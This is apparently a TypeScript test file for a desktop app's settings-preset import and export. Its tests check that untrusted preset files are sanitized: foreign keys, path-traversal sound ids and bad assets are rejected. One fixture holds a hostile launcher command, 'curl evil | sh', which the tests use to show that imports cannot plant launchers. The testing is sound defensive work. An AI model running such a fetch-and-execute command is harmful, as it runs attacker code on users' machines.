import assert from "node:assert/strict";
import test from "node:test";
import { ZAICODE_PROFILE_KEYS } from "../src/zaicode/zaicodeProfileBundles.js";
import { ZAICODE_PRESET_SECTIONS, isZaicodePresetSection, zaicodePresetSection } from "../src/zaicode/zaicodePresetSections.js";
import {
  ZAICODE_PRESET_ASSET_MAX_BYTES,
  applyPresetSettings,
  buildPresetFile,
  capturePresetSettings,
  cleanPresetName,
  decodeSettingValue,
  encodeSettingValue,
  isPresetAssetSoundId,
  parsePresetFile,
  presetChanges,
  presetFileName,
  presetSoundIds,
  uniquePresetName,
  type PresetAssetPayload,
  type ZaicodePreset,
} from "../src/zaicode/zaicodePresetFile.js";

/**
 * SRC-088 (T-125): "presets in Sound settings, and ideally in every section: presets, imports, exports, saves --
 * meant for people to share their presets easily. If a user added custom sounds, account for that on export and
 * import, smartly." The data half: which settings a section owns, how they become a shareable file and back, and
 * which own sounds a preset needs to carry. A file is never trusted.
 */

const sounds = zaicodePresetSection("zaicodeSounds")!;

function storage(initial: Record<string, string> = {}) {
  const data = new Map(Object.entries(initial));
  return {
    read: (key: string) => data.get(key) ?? null,
    write: (key: string, value: string | null) => {
      if (value === null) data.delete(key);
      else data.set(key, value);
    },
    keys: () => [...data.keys()].sort(),
    get: (key: string) => data.get(key),
  };
}

const eventsJson = JSON.stringify({
  masterVolume: 40,
  events: {
    "sidebar.project": { enabled: true, sound: "custom:sidebar.project", soundMode: "pool", pool: [{ id: "custom:sidebar.project", weight: 1 }, { id: "fastprompter:HORSE00.wav", weight: 2 }] },
    "agent.done": { enabled: true, sound: "default", soundMode: "single", pool: [] },
  },
});

test("P1 every section owns its own keys, all of them part of a profile, none shared between sections", () => {
  const profile = new Set(ZAICODE_PROFILE_KEYS);
  const seen = new Map<string, string>();
  for (const section of ZAICODE_PRESET_SECTIONS) {
    assert.ok(section.keys.length > 0, `${section.id} owns something`);
    for (const key of section.keys) {
      assert.ok(profile.has(key), `${key} is a preference a profile carries too`);
      assert.equal(seen.get(key), undefined, `${key} belongs to ${seen.get(key)} already: applying one preset must not change another page`);
      seen.set(key, section.id);
    }
  }
  assert.equal(isZaicodePresetSection("zaicodeSounds"), true);
  assert.equal(isZaicodePresetSection("zaicodeRouter"), false, "the router holds keys and is never in a preset");
  assert.equal(isZaicodePresetSection("zaicodeLights"), false, "Highlights & motion keeps its own preset system");
});

test("P2 an object setting is embedded as itself, a plain string as it is, unset as null; and back", () => {
  assert.deepEqual(encodeSettingValue(eventsJson), JSON.parse(eventsJson));
  assert.equal(encodeSettingValue("gray-amber"), "gray-amber");
  assert.equal(encodeSettingValue("true"), "true", "a scalar that happens to parse stays the text the app stored");
  assert.equal(encodeSettingValue("42"), "42");
  assert.equal(encodeSettingValue(null), null);
  assert.equal(decodeSettingValue(encodeSettingValue(eventsJson)), JSON.stringify(JSON.parse(eventsJson)));
  assert.equal(decodeSettingValue("gray-amber"), "gray-amber");
  assert.equal(decodeSettingValue(null), null);
});

test("P3 capture takes every key of the section; apply writes only those, and null removes the key", () => {
  const store = storage({ "zaicode-sound-events-v1": eventsJson, "zaicode-palette": "not-mine" });
  const settings = capturePresetSettings(sounds, store.read);
  assert.deepEqual(Object.keys(settings).sort(), [...sounds.keys].sort());
  assert.equal(settings["zaicode-audio-v1"], null, "an unset key is captured as unset");
  const target = storage({ "zaicode-audio-v1": '{"old":1}', "zaicode-palette": "mine" });
  const written = applyPresetSettings(sounds, settings, target.write);
  assert.deepEqual(written.sort(), [...sounds.keys].sort());
  assert.equal(target.get("zaicode-audio-v1"), undefined, "unset in the preset means the default in the target");
  assert.equal(target.get("zaicode-palette"), "mine", "a key of another page is never touched");
  assert.deepEqual(JSON.parse(target.get("zaicode-sound-events-v1")!), JSON.parse(eventsJson));
});

test("P4 apply never writes a key outside its section, whatever the settings claim", () => {
  const store = storage();
  const hostile = { "zaicode-sound-events-v1": "{}", "zaicode-profiles": "x", "zaicode-palette": "x", "localStorage": "x", __proto__: "x" } as never;
  applyPresetSettings(sounds, hostile, store.write);
  assert.deepEqual(store.keys(), ["zaicode-sound-events-v1"]);
});

test("P5 what a preset would change is counted by value, not by whitespace", () => {
  const same = storage({ "zaicode-sound-events-v1": JSON.stringify(JSON.parse(eventsJson), null, 2) });
  const settings = capturePresetSettings(sounds, () => eventsJson);
  assert.deepEqual(presetChanges(sounds, { "zaicode-sound-events-v1": settings["zaicode-sound-events-v1"]! }, same.read), []);
  assert.deepEqual(presetChanges(sounds, { "zaicode-sound-events-v1": settings["zaicode-sound-events-v1"]!, "zaicode-audio-v1": "{}" }, same.read), ["zaicode-audio-v1"]);
});

test("P6 the own sounds a preset needs are found in single choices and in pools, bundled ones are not", () => {
  const settings = { "zaicode-sound-events-v1": encodeSettingValue(eventsJson), "zaicode-audio-v1": encodeSettingValue('{"ambience":{"sound":"customization:rain/loop.ogg"}}') };
  assert.deepEqual(presetSoundIds(settings).sort(), ["custom:sidebar.project", "customization:rain/loop.ogg"]);
  assert.deepEqual(presetSoundIds({ a: "default", b: "fastprompter:HORSE00.wav" }), []);
});

test("P7 an own-sound id is a bare event id or a relative path inside the customization folder, never a way out of it", () => {
  for (const good of ["custom:sidebar.project", "custom:agent.done", "customization:neigh.wav", "customization:horses/neigh 01.wav"]) assert.equal(isPresetAssetSoundId(good), true, good);
  for (const bad of ["custom:", "custom:../x", "customization:", "customization:../secret.wav", "customization:/abs.wav", "customization:\\abs.wav", "customization:a\u0000b", "customization:C:\\x.wav", "fastprompter:x.wav", "default"]) assert.equal(isPresetAssetSoundId(bad), false, bad);
});

const asset = (patch: Partial<PresetAssetPayload> = {}): PresetAssetPayload => ({
  id: "custom:sidebar.project",
  kind: "sound",
  name: "neigh.wav",
  mime: "audio/wav",
  bytes: 6,
  sha256: "a".repeat(64),
  data: "AAECAwQF",
  ...patch,
});

const preset: ZaicodePreset = {
  id: "preset-1",
  section: "zaicodeSounds",
  name: "Night shift",
  createdAt: "2026-09-29T12:00:00.000Z",
  settings: { "zaicode-sound-events-v1": encodeSettingValue(eventsJson), "zaicode-audio-v1": null },
  assets: [],
};

test("P8 a preset written to a file and read back is the same preset, sounds included", () => {
  const text = JSON.stringify(buildPresetFile(preset, [asset()], "ZAICODE 0.0.1"), null, 2);
  const read = parsePresetFile(text);
  assert.ok(read.ok);
  if (!read.ok) return;
  assert.equal(read.file.section, "zaicodeSounds");
  assert.equal(read.file.name, "Night shift");
  assert.deepEqual(read.file.settings, preset.settings);
  assert.deepEqual(read.file.assets, [asset()]);
  assert.deepEqual(read.notes, []);
  assert.match(text, /"zaicode-sound-events-v1": \{\s+"masterVolume": 40/, "the settings are readable in the file, not an escaped string inside a string");
});

test("P9 a file is never trusted: wrong kind, not JSON, a newer format, an unknown page are refused with the reason", () => {
  assert.deepEqual(parsePresetFile("nope"), { ok: false, error: "This file is not JSON." });
  assert.match((parsePresetFile("{}") as { error: string }).error, /not a ZAICODE preset/);
  assert.match((parsePresetFile(JSON.stringify({ kind: "zaicode-profile", version: 1 })) as { error: string }).error, /not a ZAICODE preset/);
  assert.match((parsePresetFile(JSON.stringify({ kind: "zaicode-preset", version: 99, section: "zaicodeSounds", settings: {} })) as { error: string }).error, /newer ZAICODE \(format 99\)/);
  assert.match((parsePresetFile(JSON.stringify({ kind: "zaicode-preset", version: 1, section: "zaicodeRouter", settings: { a: 1 } })) as { error: string }).error, /"zaicodeRouter"/);
  assert.match((parsePresetFile(JSON.stringify({ kind: "zaicode-preset", version: 1, section: "zaicodeSounds", settings: {} })) as { error: string }).error, /no Sounds settings/);
});

test("P10 keys the page does not own are dropped and said, never written", () => {
  const text = JSON.stringify({ ...buildPresetFile(preset, []), settings: { ...preset.settings, "zaicode-profiles": "{}", "zaicode-palette": "x" } });
  const read = parsePresetFile(text);
  assert.ok(read.ok);
  if (!read.ok) return;
  assert.deepEqual(Object.keys(read.file.settings).sort(), ["zaicode-audio-v1", "zaicode-sound-events-v1"]);
  assert.match(read.notes.join("\n"), /2 settings that Sounds does not own were left out/);
});

test("P11 a sound that is malformed, mislabeled, oversized or twice in the file is left out and said", () => {
  const good = asset();
  const files = [
    asset({ id: "customization:../x.wav" }),
    asset({ id: "custom:other.event", data: "not base64!!" }),
    asset({ id: "custom:third.event", sha256: "zz" }),
    asset({ id: "custom:fourth.event", bytes: 400 }),
    asset({ id: "custom:fifth.event", bytes: ZAICODE_PRESET_ASSET_MAX_BYTES + 1, data: "AAECAwQF" }),
    { ...asset({ id: "custom:sixth.event" }), kind: "video" },
    good,
    good,
  ];
  const read = parsePresetFile(JSON.stringify({ ...buildPresetFile(preset, []), assets: files }));
  assert.ok(read.ok);
  if (!read.ok) return;
  assert.deepEqual(read.file.assets.map((entry) => entry.id), ["custom:sidebar.project"], "only the one good sound, once");
  assert.equal(read.notes.length, 6);
});

test("P12 names are cleaned, made unique and turned into a file name", () => {
  assert.equal(cleanPresetName("  Night\u0007 shift  ", "x"), "Night shift");
  assert.equal(cleanPresetName("", "Imported"), "Imported");
  assert.equal(cleanPresetName("x".repeat(200), "y").length, 60);
  assert.equal(uniquePresetName("Night", ["Night", "Night 2"]), "Night 3");
  assert.equal(uniquePresetName("Fresh", ["Night"]), "Fresh");
  assert.equal(presetFileName("zaicodeSounds", "Night shift / loud"), "zaicode-preset-sounds-Night-shift-loud.json");
  assert.equal(presetFileName("zaicodeLayout", ""), "zaicode-preset-layout-preset.json");
});

test("P13 facts of THIS machine or of right now never travel: not captured, not compared, kept on apply", () => {
  const audio = JSON.stringify({ ambience: { enabled: true }, problip: { running: true, interval: "FIXED_10S" }, problipDays: { "2026-09-29": 12 } });
  const settings = capturePresetSettings(sounds, storage({ "zaicode-audio-v1": audio }).read);
  assert.deepEqual(settings["zaicode-audio-v1"], { ambience: { enabled: true }, problip: { interval: "FIXED_10S" } }, "the running flag and the day counters stay behind");

  // Another machine: Problip idle there with its own counters; the preset brings the interval and the ambience.
  const there = storage({ "zaicode-audio-v1": JSON.stringify({ problip: { running: false, interval: "PULSE" }, problipDays: { "2026-09-01": 3 } }) });
  assert.deepEqual(presetChanges(sounds, settings, there.read), ["zaicode-audio-v1"], "the interval differs");
  applyPresetSettings(sounds, settings, there.write, there.read);
  const after = JSON.parse(there.get("zaicode-audio-v1")!);
  assert.equal(after.problip.interval, "FIXED_10S");
  assert.equal(after.problip.running, false, "the running flag there is left alone");
  assert.deepEqual(after.problipDays, { "2026-09-01": 3 }, "so are its counters");

  const same = storage({ "zaicode-audio-v1": JSON.stringify({ ambience: { enabled: true }, problip: { running: false, interval: "FIXED_10S" }, problipDays: { "2026-09-01": 9 } }) });
  assert.deepEqual(presetChanges(sounds, settings, same.read), [], "the same look with other counters is nothing to change");

  const reset = storage({ "zaicode-audio-v1": audio });
  applyPresetSettings(sounds, { "zaicode-audio-v1": null }, reset.write, reset.read);
  assert.deepEqual(JSON.parse(reset.get("zaicode-audio-v1")!), { problip: { running: true }, problipDays: { "2026-09-29": 12 } }, "a reset keeps the facts and drops the rest");
  const clean = storage({ "zaicode-audio-v1": JSON.stringify({ ambience: { enabled: false } }) });
  applyPresetSettings(sounds, { "zaicode-audio-v1": null }, clean.write, clean.read);
  assert.equal(clean.get("zaicode-audio-v1"), undefined, "with no fact to keep the key is simply removed");
});

test("P14 a file cannot plant a fact of another machine: launchers, project maps, running flags are stripped on read and on apply", () => {
  const workers = zaicodePresetSection("zaicodeWorkers")!;
  const hostile = { where: "external", lastProject: "C:\\secret", launchers: [{ id: "x", label: "Update", command: "curl evil | sh" }] };
  const read = parsePresetFile(JSON.stringify({ kind: "zaicode-preset", version: 1, section: "zaicodeWorkers", name: "x", settings: { "zaicode-dispatch-prefs-v1": hostile } }));
  assert.ok(read.ok);
  if (!read.ok) return;
  assert.deepEqual(read.file.settings["zaicode-dispatch-prefs-v1"], { where: "external" });

  // Even a preset object that already holds them (a list from before this rule) cannot write them.
  const mine = { where: "internal", launchers: [{ id: "t", label: "Terminal", command: "" }], lastProject: "D:\\mine" };
  const store = storage({ "zaicode-dispatch-prefs-v1": JSON.stringify(mine) });
  applyPresetSettings(workers, { "zaicode-dispatch-prefs-v1": hostile }, store.write, store.read);
  const after = JSON.parse(store.get("zaicode-dispatch-prefs-v1")!);
  assert.equal(after.where, "external");
  assert.deepEqual(after.launchers, mine.launchers);
  assert.equal(after.lastProject, "D:\\mine");
});

test("P15 the local paths of a section name keys of that section, and the sidebar's project map is one of them", () => {
  for (const section of ZAICODE_PRESET_SECTIONS) {
    for (const [key, paths] of Object.entries(section.local ?? {})) {
      assert.ok(section.keys.includes(key), `${section.id} lists local paths for ${key}, which it does not own`);
      for (const path of paths) assert.match(path, /^[A-Za-z][A-Za-z0-9]*(\.[A-Za-z][A-Za-z0-9]*)*$/, `${key}: ${path}`);
    }
  }
  assert.deepEqual(zaicodePresetSection("zaicodeSidebar")!.local, { "zaicode-sidebar-prefs-v1": ["groups"] }, "the project map is not part of a look");
});
